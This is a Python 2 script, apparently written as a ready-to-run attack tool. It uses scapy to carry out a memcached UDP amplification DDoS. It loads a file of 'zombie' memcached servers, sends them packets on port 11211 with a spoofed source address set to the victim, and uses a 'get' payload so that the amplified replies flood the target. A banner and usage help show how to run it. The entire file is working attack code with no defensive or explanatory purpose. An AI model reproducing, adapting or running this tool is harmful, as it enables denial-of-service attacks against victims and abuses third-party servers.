# -*- coding: UTF-8 -*-
'''
Created on 2018.01.20
'''
#!/usr/bin/python
from scapy.all import *
import sys
def udp_forge_packets(mem_address, mem_port, target_address, target_port, payload):
    pkt = scapy.all.IP(dst=mem_address, src=target_address) / scapy.all.UDP(sport=target_port, dport=mem_port) / payload
    send(pkt, inter=1, count=3)
def ddos_attack_targets(mem_address, mem_port, target_address, target_port, payload, times):
    if (not mem_address):
        return False
    if (not mem_port):
        return False
    if (not target_address):
        return False
    if (not target_port):
        return False
    else:
        try:
            mem_address = mem_address.strip('\n')
            mem_address = mem_address.strip('\r\n')
            mem_address = mem_address.strip()
            target_address = target_address.strip('\n')
            target_address = target_address.strip('\r\n')
            target_address = target_address.strip()
            # send 
            udp_forge_packets(mem_address, mem_port, target_address, target_port, payload)
            print "[times: %8d ]" % times, "[Zombie's Address: ", mem_address, "%s ]" % mem_address 
        except Exception, e:
            print "[error :", e.message, "]"
        return True 
def reload_zombies_list(zombies_server_path):
    try:
        global zombies_list
        if (len(zombies_server_path) < 1):
            return ""
        with open(zombies_server_path) as f:
            zombies_list = f.readlines()
        return zombies_list
    except Exception, e:
        print e.message
def banner_help():
    print'''
----------------------------------------------------------
             _____ _     ___      _ 
            |  ___| |   /   |    | |
            |___ \| |_ / /| |_ __| | __   
                \ \ __/ /_| | '__| |/ /
            /\__/ / |_\___  | |  |   < 
            \____/ \__|   |_/_|  |_|\_\
  
----------------------------------------------------------
'''
    print "Example:\t"
    print "\tattack_ddos.py server.txt 127.0.0.1 80 10"
    print "\t<path> <address> <port> <times>"
    print "\t<option1> 1 the server.txt 's path"
    print "\t<option2> 2 ddos target address"
    print "\t<option3> 3 ddos target port"
    print "\t<option4> 4 ddos times"
    print "----------------------------------------------------------"
if __name__ == '__main__':
    zombies_list = []
    current_index = 0
    attack_times = 5
    if len(sys.argv) == 5:
        path = sys.argv[1]
        victim_address = sys.argv[2]
        victim_port = int(sys.argv[3])
        attack_times = int(sys.argv[4])
        reload_zombies_list(path)
    else:
        banner_help()
        exit()
        path = 'server.txt'
        reload_zombies_list(path)
    while attack_times >= 0:
        while current_index < len(zombies_list):
            try:
                action_data = "\x00\x00\x00\x00\x00\x01\x00\x00get anVzdGF0ZXN0\r\n"
                ddos_attack_targets(zombies_list[current_index], 11211, victim_address, victim_port, action_data, current_index)   
                action_data = ""
            except KeyboardInterrupt, e:
                print "[error : script stopped [ctrl + c]...]"        
            except Exception, e:
                print "[error :", e.message, "]"
            current_index = current_index + 1
        attack_times = attack_times - 1
        current_index = 0
    pass
